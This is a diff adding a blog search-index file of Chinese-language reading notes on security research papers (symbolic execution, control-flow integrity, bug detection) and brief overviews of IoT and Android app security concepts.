+ 作如下假设: <pre class="line-numbers language-none"><code class="language-none">mem_addr1 = v
+z = mem_addr2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+ 即忽略addr1与addr2是否为别名</li>
+<li>Let subsequent analysis steps deal with them.(滞后处理,比如之后再使用SMT判断二者是否存在别名关系)</li>
+<li>别名分析</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>System calls<ul>
+<li>解决方案:副作用建模(规则?比如说使用上一次的执行结果)</li>
+</ul>
+</li>
+<li>Path Selection<br> 将路径看成树,主要是要防止循环的出现(设置执行上限)<ul>
+<li>解决方案<ol>
+<li>DFS</li>
+<li>实际执行</li>
+<li>随机路径</li>
+<li>启发式 ?</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>其它<ul>
+<li>符号跳转(跳转表)<ul>
+<li>解决方案<ol>
+<li>实际执行</li>
+<li>SMT</li>
+<li>Static Analysis(作者认为效果最优)</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>分析效果:三个指数     <img src="/2021/07/13/all-you-ever-wanted-to-know-about-dynamic-taint-analysis-and-forward-symbolic-execution/%E4%B8%89%E4%B8%AA%E6%8C%87%E6%95%B0.png" class="" title="样例代码">  
+<ol>
+<li>执行时间是程序分支数目的指数级</li>
+<li>指数数量的formula</li>
+<li>指数规模的formula size:例如x→s+s+s+s....+s</li>
+</ol>
+<ul>
+<li>解决方案:<ol>
+<li>硬件加速</li>
+<li>简化约束</li>
+<li>调整符号名→unique</li>
+<li>分步求解</li>
+<li>weak precondition?</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>Mixed Execution:对于某些可信输入,不符号化</li>
+</ul>
+</li>
+</ul>
+<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{schwartz2010all,<br>  title={All you ever wanted to know about dynamic taint analysis and forward symbolic execution (but might have been afraid to ask)},<br>  author={Schwartz, Edward J and Avgerinos, Thanassis and Brumley, David},<br>  booktitle={2010 IEEE symposium on Security and privacy},<br>  pages={317--331},<br>  year={2010},<br>  organization={IEEE}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>符号执行</tag>
+        <tag>动态污点分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KLEE: Unassisted and Automatic Generation of High-Coverage Tests for Complex Systems Programs</title>
+    <url>/2021/07/13/klee-unassisted-and-automatic-generation-of-high-coverage-tests-for-complex-systems-programs/</url>
+    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1>]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>符号执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>APISan: Sanitizing API Usages through Semantic Cross-checking</title>
+    <url>/2021/07/16/apisan-sanitizing-api-usages-through-semantic-cross-checking/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
+<ol>
+<li>主要思路：学习已有的API使用模式，检测使用不当的API</li>
+<li>缺陷：neither sound nor complete</li>
+</ol>
+<h2 id="Design"><a href="#Design" class="headerlink" title="Design"></a>Design</h2><ul>
+<li>四种API上下文模式<ol>
+<li>Return：返回值不仅仅返回计算结果，也可能表示当前的运算状态</li>
+<li>Argument：函数的参数之间可能存在某种运算关系，例如memory copy 的size应该小于buffer的size</li>
+<li>Causality：两个API之间可能存在因果关系，例如在请求锁之前应该释放锁</li>
+<li>Conditions：条件关系，例如要验证一个账号的合法性，首先该账号得存在</li>
+</ol>
+</li>
+</ul>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{yun2016apisan,<br>  title={Apisan: Sanitizing ${$API$}$ usages through semantic cross-checking},<br>  author={Yun, Insu and Min, Changwoo and Si, Xujie and Jang, Yeongjin and Kim, Taesoo and Naik, Mayur},<br>  booktitle={25th ${$USENIX$}$ Security Symposium (${$USENIX$}$ Security 16)},<br>  pages={363--378},<br>  year={2016}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>Bug finding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Chopped Symbolic Execution</title>
+    <url>/2021/07/16/chopped-symbolic-execution/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{trabish2018chopped,<br>  title={Chopped symbolic execution},<br>  author={Trabish, David and Mattavelli, Andrea and Rinetzky, Noam and Cadar, Cristian},<br>  booktitle={Proceedings of the 40th International Conference on Software Engineering},<br>  pages={350--360},<br>  year={2018}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Control-Flow Integrity: Precision, Security, and Performance</title>
+    <url>/2021/07/16/control-flow-integrity-precision-security-and-performance/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
+<ol>
+<li>主题：评估CFI的安全性能和运行性能</li>
+</ol>
+<h1 id="核心内容"><a href="#核心内容" class="headerlink" title="核心内容"></a>核心内容</h1><ol>
+<li>classification of static analysis which used to pre-determine foward indirect control-flow    <img src="/2021/07/16/control-flow-integrity-precision-security-and-performance/classificationOfSAP.png" class=""> </li>
+<li>认为AIR不足以反应CFI的安全性能，提出了一种新的安全评价指标 EC/LC</li>
+</ol>
+<h2 id="启发"><a href="#启发" class="headerlink" title="启发"></a>启发</h2><ol>
+<li>本文的评估方法可以作为论文的实验方法</li>
+<li>该论文对CFI做了综述，实际上也是对非直接调用的识别做综述</li>
+</ol>
+<h2 id="Future-work"><a href="#Future-work" class="headerlink" title="Future work"></a>Future work</h2><ol>
+<li>未来的CFI需要基于流敏感和上下文敏感</li>
+</ol>
+<h2 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h2><ul>
+<li>Average Indirect target Reduction (AIR) ——Zhang and Sekar 2013<br>So far, the only existing quantitative measure of the security of a CFI implementation is Average Indirect Target Reduction (AIR).</li>
+</ul>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@article{burow2017control,<br>  title={Control-flow integrity: Precision, security, and performance},<br>  author={Burow, Nathan and Carr, Scott A and Nash, Joseph and Larsen, Per and Franz, Michael and Brunthaler, Stefan and Payer, Mathias},<br>  journal={ACM Computing Surveys (CSUR)},<br>  volume={50},<br>  number={1},<br>  pages={1--33},<br>  year={2017},<br>  publisher={ACM New York, NY, USA}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cross-Checking Semantic Correctness: The Case of Finding File System Bugs</title>
+    <url>/2021/07/16/cross-checking-semantic-correctness-the-case-of-finding-file-system-bugs/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
+<ol>
+<li>主题：Find high-level semantics bugs</li>
+<li>核心思路：cross checking   <ol>
+<li>multiple existing implemetations may obey implicit high-level semantics<br>对于类似操作，其不同实现在语义上应该是相似的</li>
+</ol>
+</li>
+<li>limitations<ol>
+<li>neither sound nor complete</li>
+</ol>
+</li>
+</ol>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{min2015cross,<br>  title={Cross-checking semantic correctness: The case of finding file system bugs},<br>  author={Min, Changwoo and Kashyap, Sanidhya and Lee, Byoungyoung and Song, Chengyu and Kim, Taesoo},<br>  booktitle={Proceedings of the 25th Symposium on Operating Systems Principles},<br>  pages={361--377},<br>  year={2015}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>Bug finding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IoT安全</title>
+    <url>/2021/07/19/iot-an-quan/</url>
+    <content><![CDATA[<h1 id="IoT发展趋势"><a href="#IoT发展趋势" class="headerlink" title="IoT发展趋势"></a>IoT发展趋势</h1><p>特点：</p>
+<ol>
+<li>前景广阔</li>
+<li>工业领域应用较多</li>
+<li>IoT设备中摄像头、路由器数量占一半以上，受攻击概率更大</li>
+<li>分布于各行各业</li>
+</ol>
+<h1 id="物联网终端"><a href="#物联网终端" class="headerlink" title="物联网终端"></a>物联网终端</h1><h2 id="作用与分类"><a href="#作用与分类" class="headerlink" title="作用与分类"></a>作用与分类</h2><ul>
+<li>作用<ol>
+<li>物理信息→数据信息(采集、识别、控制)</li>
+<li>终端将数据传输到决策服务端，服务端反馈指令给终端接收</li>
+</ol>
+</li>
+<li>分类</li>
+</ul>
+<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><h1 id="IoT安全"><a href="#IoT安全" class="headerlink" title="IoT安全"></a>IoT安全</h1><h2 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h2><p>特点：</p>
+<ol>
+<li>设备小，数量多，影响大</li>
+</ol>
+<h2 id="保障体系"><a href="#保障体系" class="headerlink" title="保障体系"></a>保障体系</h2><p>全面检测与态势感知</p>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul>
+<li>态势感知？<br>  在大规模网络环境中对能够引起网络态势发生变化的安全要素进行获取、理解、显示以及最近发展趋势的顺延性预测，而最终的目的是要进行决策与行动</li>
+</ul>
+]]></content>
+      <categories>
+        <category>IoT</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Hector: Detecting Resource-Release Omission Faults in Error-Handling Code for Systems Software</title>
+    <url>/2021/07/15/hector-detecting-resource-release-omission-faults-in-error-handling-code-for-systems-software/</url>
+    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><blockquote>
+<p>文章速览:</p>
+<ol>
+<li>目标:检测资源未释放导致的错误</li>
+<li>方法:根据已有错误处理判断其它错误处理代码是否正确</li>
+<li>Future work:<ol>
+<li>若代码中本不存在错误处理则无法使用本方法</li>
+<li>自动修复错误</li>
+<li>用该方法检测其它类型的错误</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<h2 id="1-1-疑问"><a href="#1-1-疑问" class="headerlink" title="1.1. 疑问"></a>1.1. 疑问</h2><ul>
+<li>什么是specification mining?规则匹配?</li>
+</ul>
+<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{saha2013hector,<br>  title={Hector: Detecting resource-release omission faults in error-handling code for systems software},<br>  author={Saha, Suman and Lozi, Jean-Pierre and Thomas, Ga{"e}l and Lawall, Julia L and Muller, Gilles},<br>  booktitle={2013 43rd Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN)},<br>  pages={1--12},<br>  year={2013},<br>  organization={IEEE}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>bug detect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Precise and Scalable Detection of Double-Fetch Bugs in OS Kernels</title>
+    <url>/2021/07/16/precise-and-scalable-detection-of-double-fetch-bugs-in-os-kernels/</url>
+    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><p>文章速览：</p>
+<ol>
+<li>主题：检测double-fetch bug</li>
+<li>核心内容：为double-fetch bug作了形式化定义<ol>
+<li>There are at least two reads from userspace memory</li>
+<li>The two fetches must cover an overlapped memory region in the userspace</li>
+<li>A relation must exist based on the overlapped regions between the two fetches</li>
+<li>DEADLINE cannot prove that the relation established still holds after the second fetch</li>
+</ol>
+</li>
+</ol>
+<h2 id="1-1-limitations"><a href="#1-1-limitations" class="headerlink" title="1.1. limitations"></a>1.1. limitations</h2><ol>
+<li>Source code coverage<ol>
+<li>not compiled code</li>
+<li>cofing_*=n</li>
+</ol>
+</li>
+<li>Path construction<ol>
+<li>limit execution path within an enclosing function</li>
+<li>unrolling times of loop</li>
+</ol>
+</li>
+<li>Symbolic checking<ol>
+<li>pointers</li>
+<li>inline assemblies</li>
+<li>incomplete assumptions on enclosing functions</li>
+</ol>
+</li>
+</ol>
+<h2 id="1-2-讨论"><a href="#1-2-讨论" class="headerlink" title="1.2. 讨论"></a>1.2. 讨论</h2><ol>
+<li>What is double-fetch bug？<br> Sometimes，we use some cirtical value fetched from userspace.These values should be checked for security before using,while if we fetched them twice,and the first time before checking,the second time after checing but before using,double-fetch bug may be triggered.   </li>
+</ol>
+<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{xu2018precise,<br>  title={Precise and scalable detection of double-fetch bugs in OS kernels},<br>  author={Xu, Meng and Qian, Chenxiong and Lu, Kangjie and Backes, Michael and Kim, Taesoo},<br>  booktitle={2018 IEEE Symposium on Security and Privacy (SP)},<br>  pages={661--678},<br>  year={2018},<br>  organization={IEEE}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>RWset: Attacking Path Explosion in Constraint-Based Test Generation</title>
+    <url>/2021/07/16/rwset-attacking-path-explosion-in-constraint-based-test-generation/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><p>文章速览：</p>
+<ol>
+<li>主题：减少符号执行的路径爆炸问题</li>
+<li>主要思想：剪枝<ol>
+<li>某次执行与前次执行的影响相似 pruned</li>
+<li>某次执行与前次执行只受接下来输入数据的影响 pruned</li>
+</ol>
+</li>
+</ol>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><p>@inproceedings{boonstoppel2008rwset,<br>  title={RWset: Attacking path explosion in constraint-based test generation},<br>  author={Boonstoppel, Peter and Cadar, Cristian and Engler, Dawson},<br>  booktitle={International conference on Tools and Algorithms for the Construction and Analysis of Systems},<br>  pages={351--366},<br>  year={2008},<br>  organization={Springer}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>移动端安全概要</title>
+    <url>/2021/07/19/yi-dong-duan-an-quan-gai-yao/</url>
+    <content><![CDATA[<h1 id="发展态势"><a href="#发展态势" class="headerlink" title="发展态势"></a>发展态势</h1><ol>
+<li>新发布App数量多，增幅大</li>
+</ol>
+<h2 id="安全挑战"><a href="#安全挑战" class="headerlink" title="安全挑战"></a>安全挑战</h2><ol>
+<li>二维码藏毒：将病毒链接成二维码发布</li>
+<li>APP二次打包被植入木马</li>
+<li>APP盗版</li>
+<li>通信劫持</li>
+</ol>
+<h1 id="Android安全"><a href="#Android安全" class="headerlink" title="Android安全"></a>Android安全</h1><h2 id="Android系统机制"><a href="#Android系统机制" class="headerlink" title="Android系统机制"></a>Android系统机制</h2><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><ul>
+<li>dex与odex<br>  odex其实就是编译后的dex</li>
+</ul>
+<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p>权限级别：</p>
+<ol>
+<li>normal：应用申请这个级别的权限时，系统会比较大方的授予</li>
+<li>dangerous：系统在授予该级别权限之前会询问用户</li>
+<li>signature：如果A应用定义了1个权限P，当B应用申请权限P的时候，仅当A和B两个应用拥有相同的证书签名，系统才会授予B应用该权限。该情况下，通常A、B两个应用是由同一个开发者开发的或者是同一个公司的产品。</li>
+<li>signatureOrSystem：只有APP存在于Android系统的镜像里或者使用相同证书签名的应用，才会被授予该级别权限。少见，通常用于Android系统内置应用。<h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3></li>
+</ol>
+<h3 id="WebView"><a href="#WebView" class="headerlink" title="WebView"></a>WebView</h3><p>WebView objects allow you to display web content as part of your activity layout, but lack some of the features of fully-developed browsers. </p>
+<h4 id="Android与JS交互"><a href="#Android与JS交互" class="headerlink" title="Android与JS交互"></a>Android与JS交互</h4><p>我们可以在网页中随意调用本地的Java代码<br>步骤(资源中有对应的html文件)：</p>
+<ol>
+<li>注册html</li>
+<li>调用对应接口</li>
+</ol>
+<h4 id="WebView远程代码执行漏洞"><a href="#WebView远程代码执行漏洞" class="headerlink" title="WebView远程代码执行漏洞"></a>WebView远程代码执行漏洞</h4><blockquote>
+<p>触发条件： API &lt;= 16      </p>
+</blockquote>
+<blockquote>
+<p>漏洞成因：没有正确限制WebView.addJavascriptInterface方法的使用，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法   </p>
+</blockquote>
+<blockquote>
+<p>简要描述：通过addJavascriptInterface给WebView加入一个JavaScript桥接接口，JavaScript通过调用这个接口可以直接操作本地的JAVA接口。</p>
+</blockquote>
+<blockquote>
+<p>参考文献：</p>
+<ol>
+<li>Attacks on WebView in the Android System    </li>
+<li>POC:<a href="https://cloud.tencent.com/developer/article/1743487">https://cloud.tencent.com/developer/article/1743487</a></li>
+</ol>
+</blockquote>
+<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ol>
+<li>网络中间人攻击：通信过程中给出现非法第三方</li>
+<li>组件劫持攻击：例如页面劫持，页面跳转至不可信第三方</li>
+<li>组件能力滥用：android系统组件在指定Intent以后默认情况下是可以被外部程序访问的，可以被外部访问意味着可能被其它程序用来串谋攻击。<ol>
+<li>Activity</li>
+<li>BroadCast——发送安全与接收安全、有序广播与无序广播<br> 有序广播可被优先级高的应用篡改或终止</li>
+<li>Service<br> 直接stopService影响程序正常使用</li>
+<li>Content Provider<br>程序间数据共享，如无保护会导致无授权获取敏感信息</li>
+</ol>
+</li>
+<li>调试敏感信息泄露<br> LogCat敏感信息泄露，不仅输出系统日志信息，也会输出应用日志信息</li>
+<li>服务端注入攻击(对服务器中的数据库进行注入)</li>
+<li>客户端注入攻击(对本地的数据库进行注入)<br> 成因：使用SQLite进行数据存储<br> 例子：<ol>
+<li>WebView注入；</li>
+<li>通过原始SQL语句对SQLite数据库进行传统的SQL注入；</li>
+<li><a href="http://www.cxyzjd.com/article/u013107656/53337422">内容提供程序SQL注入</a>；</li>
+<li>内容提供程序路径遍历。</li>
+</ol>
+</li>
+<li>网络传输信息泄露</li>
+<li>外部存储信息泄露   <ul>
+<li>sdcard</li>
+</ul>
+</li>
+<li>内部存储信息泄露<ul>
+<li>app/</li>
+<li>data/</li>
+</ul>
+</li>
+</ol>
+<h2 id="APP安全渗透测试"><a href="#APP安全渗透测试" class="headerlink" title="APP安全渗透测试"></a>APP安全渗透测试</h2><p>应用分类：</p>
+<ol>
+<li>web应用</li>
+<li>原生应用——响应速度快、不支持跨平台</li>
+<li>混合应用</li>
+</ol>
+<h2 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h2><h3 id="防篡改"><a href="#防篡改" class="headerlink" title="防篡改"></a>防篡改</h3><ul>
+<li>防二次打包</li>
+</ul>
+<h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><ul>
+<li>多进程保护</li>
+<li>防内存dump<ol>
+<li>inotify防内存dump——监控/proc/pid/mem</li>
+</ol>
+</li>
+</ul>
+<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><ul>
+<li>每一代加固技术对应的对抗手段有哪些？</li>
+<li>代码抽取保护</li>
+</ul>
+<h1 id="安全手机系统"><a href="#安全手机系统" class="headerlink" title="安全手机系统"></a>安全手机系统</h1><h2 id="加密电话"><a href="#加密电话" class="headerlink" title="加密电话"></a>加密电话</h2><ul>
+<li>加密VoIP电话：将语音转化为IP数据包</li>
+</ul>
+]]></content>
+      <categories>
+        <category>移动端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>jar包调试</title>
+    <url>/2021/07/23/jar-bao-diao-shi/</url>
+    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>解压jar包，并选择IDEA打开</p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><ol>
+<li>Debug模式启动jar包<pre class="line-numbers language-none"><code class="language-none">java -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=y -jar test.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>IDEA run菜单下添加configuration，添加remote目标</li>
+<li>run</li>
+</ol>
+<h1 id="修改jar包"><a href="#修改jar包" class="headerlink" title="修改jar包"></a>修改jar包</h1><blockquote>
+<p>注意点：解压缩的时候要用java自带的解压缩工具，否则可能会出错</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>Apex-Automated inference of error specifications for c apis</title>
+    <url>/2021/07/14/apex-automated-inference-of-error-specifications-for-c-apis/</url>
+    <content><![CDATA[<h1 id="1-阅读笔记"><a href="#1-阅读笔记" class="headerlink" title="1. 阅读笔记"></a>1. 阅读笔记</h1><blockquote>
+<p>文章速览</p>
+<ol>
+<li>主要目标:识别错误处理路径</li>
+<li>核心idea:错误处理的路径相对于常规路径更加简单</li>
+</ol>
+</blockquote>
+<h2 id="1-1-缺陷"><a href="#1-1-缺陷" class="headerlink" title="1.1. 缺陷"></a>1.1. 缺陷</h2><ol>
+<li>受到数据集限制</li>
+<li>文章的核心思路是假设错误路径与非错误路径不同,但是可能存在与其相悖的情况</li>
+<li>文章的Bug finding依赖于人工判断</li>
+</ol>
+<h1 id="2-Cite"><a href="#2-Cite" class="headerlink" title="2. Cite"></a>2. Cite</h1><p>@inproceedings{kang2016apex,<br>  title={Apex: Automated inference of error specifications for c apis},<br>  author={Kang, Yuan and Ray, Baishakhi and Jana, Suman},<br>  booktitle={Proceedings of the 31st IEEE/ACM International Conference on Automated Software Engineering},<br>  pages={472--482},<br>  year={2016}<br>}</p>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Control Flow Integrity for COTS Binaries</title>
+    <url>/2021/07/30/control-flow-integrity-for-cots-binaries/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h2 id="引用和知识"><a href="#引用和知识" class="headerlink" title="引用和知识"></a>引用和知识</h2><pre class="line-numbers language-none"><code class="language-none">Previous implementations of CFI have required
+compiler support or the presence of relocation or debug
+information in the binary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{zhang2013control,
+  title={Control flow integrity for $\{$COTS$\}$ binaries},
+  author={Zhang, Mingwei and Sekar, R},
+  booktitle={22nd $\{$USENIX$\}$ Security Symposium ($\{$USENIX$\}$ Security 13)},
+  pages={337--352},
+  year={2013}
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Enforcing Forward-Edge Control-Flow Integrity in GCC &amp; LLVM</title>
+    <url>/2021/07/29/enforcing-forward-edge-control-flow-integrity-in-gcc-llvm/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><blockquote>
+<p>文章速览<br>贡献：    </p>
+<ol>
+<li>VTV</li>
+<li>find forward-edge control-flow vulnerabilities</li>
+</ol>
+</blockquote>
+<h2 id="观点或知识"><a href="#观点或知识" class="headerlink" title="观点或知识"></a>观点或知识</h2><pre class="line-numbers language-none"><code class="language-none">most indirect calls in C++ are virtual calls (e.g., 91.8% in Chrome)
+所以在c++(或者说其它的面向对象语言)中，动态特性可以用来检测bug，将crix中C语言的漏洞模式转化到C++中！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">vtable是放在read-only区域的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><ul>
+<li>它的VTV(VTable Vertification)是如何实现的？<br>  在虚调用发生前判断调用方法是都在合法的集合中。<br>  从方法论上来说，它应该没有任何创新，仍然使用CHA那一套。本文最大的贡献就是它真正地将CFI应用到了工业界中去。</li>
+</ul>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{tice2014enforcing,
+  title={Enforcing forward-edge control-flow integrity in $\{$GCC$\}$ \&amp; $\{$LLVM$\}$},
+  author={Tice, Caroline and Roeder, Tom and Collingbourne, Peter and Checkoway, Stephen and Erlingsson, {\'U}lfar and Lozano, Luis and Pike, Geoff},
+  booktitle={23rd $\{$USENIX$\}$ Security Symposium ($\{$USENIX$\}$ Security 14)},
+  pages={941--955},
+  year={2014}
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Control-Flow Bending: On the Effectiveness of Control-Flow Integrity</title>
+    <url>/2021/07/30/control-flow-bending-on-the-effectiveness-of-control-flow-integrity/</url>
+    <content><![CDATA[<h1 id="阅读笔记"><a href="#阅读笔记" class="headerlink" title="阅读笔记"></a>阅读笔记</h1><h2 id="引用和知识"><a href="#引用和知识" class="headerlink" title="引用和知识"></a>引用和知识</h2><pre class="line-numbers language-none"><code class="language-none">CFI,in it's best form,can not stop all attacks.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">When no shadow stack is in place, dispatcher functions allow powerful attacks. Consequently
+CFI without return instruction integrity is not secure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="思考与讨论"><a href="#思考与讨论" class="headerlink" title="思考与讨论"></a>思考与讨论</h2><ul>
+<li>能否在每次压入返回地址的时候对返回地址进行保护？<ul>
+<li>目前的保护方式有canary和shadow stack</li>
+<li>比如说以某个值为key，然后对return address进行加密，存放再canary的地方<ul>
+<li>缺陷：执行效率比较慢，每次函数返回都要进行两次加密计算→挑选合适的加密算法</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Cite"><a href="#Cite" class="headerlink" title="Cite"></a>Cite</h1><pre class="line-numbers language-none"><code class="language-none">@inproceedings{carlini2015control,
+  title={Control-flow bending: On the effectiveness of control-flow integrity},
+  author={Carlini, Nicholas and Barresi, Antonio and Payer, Mathias and Wagner, David and Gross, Thomas R},
+  booktitle={24th $\{$USENIX$\}$ Security Symposium ($\{$USENIX$\}$ Security 15)},
+  pages={161--176},
+  year={2015}
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      <categories>
+        <category>论文</category>
+      </categories>
+      <tags>
+        <tag>CFI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Losing Control: On the Effectiveness of Control- Flow Integrity Under Stack Attacks</title>
+    <url>/2021/08/01/losing-control-on-the-effectiveness-of-control-flow-integrity-under-stack-attacks/</url>
+    <content><![CDATA[<h1 id="阅读记录"><a href="#阅读记录" class="headerlink" title="阅读记录"></a>阅读记录</h1><blockquote>
+<p>文章速览: 本篇文章主要针对IFCC</p>
+</blockquote>
+<h2 id="结论与观点"><a href="#结论与观点" class="headerlink" title="结论与观点"></a>结论与观点</h2><ul>
+<li>永不信任可写区域的内存？那代码动态产生怎么办？代码的灵活性会大大降低。不太现实...</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">Since DEP prevents code injection, code reuse has become
+a key technique in modern exploits that bypass all
+current mitigations.
+DEP的出现使得代码复用技术成为了攻击的关键技术<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">CPI protects code
+pointers from being overwritten, and randomization hides
+the code layout.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">IFCC and VTV [50], are vulnerable to this kind of attack.
+这类attack指的是修改callee-saved-reg值的attack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">攻击影子堆栈的思路：覆盖syscall的返回值，关键系统调用：sysenter
+原因:kernel mode下，函数返回不会被检查<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="问题与讨论"><a href="#问题与讨论" class="headerlink" title="问题与讨论"></a>问题与讨论</h2><ul>
+<li>CFI在保护的同时会造成其它信息的泄露？<ul>
+<li>不会，但是CFI会用到某些callee saved registers，并且它们会被存放到栈上，从而被泄露</li>
+</ul>
+</li>
+<li>what is COOP?</li>
+<li>What is TLS？</li>
+<li>Isolation-based Defenses</li>
+</ul>
